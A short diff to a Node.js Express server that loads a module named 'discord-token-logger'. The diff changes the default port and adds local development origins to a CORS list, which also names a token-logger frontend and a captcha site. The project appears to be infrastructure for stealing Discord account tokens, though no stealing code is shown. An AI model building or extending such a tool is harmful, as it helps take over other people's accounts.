@@ -11,7 +11,7 @@ console.log('📦 Loading DiscordTokenLogger...');
 const DiscordTokenLogger = require('./discord-token-logger');
 
 const app = express();
-const PORT = process.env.PORT || 6000;
+const PORT = process.env.PORT || 8080;
 
 console.log(`🔧 Server configured for port ${PORT}`);
 
@@ -165,6 +165,10 @@ app.use(cors({
     'https://captchaguild.com/api',
     'http://localhost:3000',
     'http://localhost:5000',
+    'http://localhost:5001',
+    'http://127.0.0.1:3000',
+    'http://127.0.0.1:5000',
+    'http://127.0.0.1:5001',
     'https://discord-token-logger-frontend.vercel.app',
   ],
   credentials: true,
